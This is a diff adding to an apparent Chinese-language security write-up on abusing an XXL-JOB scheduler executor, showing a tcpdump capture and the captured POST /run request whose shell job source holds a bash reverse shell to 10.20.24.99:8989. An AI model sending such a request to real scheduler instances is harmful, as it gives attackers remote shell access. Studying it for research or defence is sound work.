@@ -390,7 +390,40 @@ Connection: close
 id=2&executorParam=&addressList=http%3A%2F%2F10.88.105.53%3A9999
 ```
 
+wireshark 抓包看看
 
+```
+╰─$ sudo tcpdump port 9999 -w 9999.pcap
+tcpdump: data link type PKTAP
+tcpdump: listening on pktap, link-type PKTAP (Apple DLT_PKTAP), capture size 262144 bytes
+^C25 packets captured
+349 packets received by filter
+0 packets dropped by kernel
+```
+
+![](./run.png)
+
+```
+POST /run HTTP/1.1
+Content-Type: application/json;charset=UTF-8
+Accept-Charset: application/json;charset=UTF-8
+Cache-Control: no-cache
+Pragma: no-cache
+User-Agent: Java/1.8.0_60
+Host: 10.88.105.53:9999
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+Content-Length: 326
+
+{"jobId":2,"executorHandler":"","executorParams":"","executorBlockStrategy":"SERIAL_EXECUTION","executorTimeout":0,"logId":14,"logDateTime":1603865786404,"glueType":"GLUE_SHELL","glueSource":"bash -i \u003e\u0026 /dev/tcp/10.20.24.99/8989 0\u003e\u00261\n","glueUpdatetime":1603860395000,"broadcastIndex":0,"broadcastTotal":1}
+
+HTTP/1.1 200 OK
+content-type: text/html;charset=UTF-8
+content-length: 12
+connection: keep-alive
+
+{"code":200}
+```
 
 
 
